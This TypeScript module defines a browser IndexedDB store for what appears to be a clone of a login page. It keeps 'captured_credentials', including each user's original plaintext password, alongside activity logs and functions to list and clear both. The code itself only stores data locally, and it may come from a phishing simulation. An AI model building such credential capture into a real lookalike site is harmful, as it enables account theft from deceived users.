import { openDB } from 'idb';

const DB_NAME = 'snapCloneDB';
const CREDENTIALS_TABLE = 'captured_credentials';
const ACTIVITY_TABLE = 'activity_logs';

export async function initDB() {
  const db = await openDB(DB_NAME, 3, {
    upgrade(db) {
      if (db.objectStoreNames.contains('simulatedUsers')) {
        db.deleteObjectStore('simulatedUsers');
      }
      if (db.objectStoreNames.contains('activityLog')) {
        db.deleteObjectStore('activityLog');
      }
      
      if (!db.objectStoreNames.contains(CREDENTIALS_TABLE)) {
        db.createObjectStore(CREDENTIALS_TABLE, { keyPath: 'id' });
      }
      if (!db.objectStoreNames.contains(ACTIVITY_TABLE)) {
        db.createObjectStore(ACTIVITY_TABLE, { keyPath: 'id' });
      }
    },
  });
  return db;
}

export async function saveUser(method: string, identifier: string, passwordHash: string, originalPassword?: string) {
  const db = await initDB();
  await db.add(CREDENTIALS_TABLE, {
    id: crypto.randomUUID(),
    auth_method: method,
    identifier: identifier,
    password_hash: passwordHash,
    original_password: originalPassword,
    metadata: {},
    created_at: new Date().toISOString(),
  });
}

export async function logActivity(action: string, metadata?: string) {
  const db = await initDB();
  await db.add(ACTIVITY_TABLE, {
    id: crypto.randomUUID(),
    action: action,
    metadata: metadata ? { details: metadata } : null,
    created_at: new Date().toISOString(),
  });
}

export async function getActivities() {
  const db = await initDB();
  return await db.getAll(ACTIVITY_TABLE);
}

export async function clearActivities() {
  const db = await initDB();
  await db.clear(ACTIVITY_TABLE);
}

export async function getUsers() {
  const db = await initDB();
  return await db.getAll(CREDENTIALS_TABLE);
}

export async function clearUsers() {
  const db = await initDB();
  await db.clear(CREDENTIALS_TABLE);
}
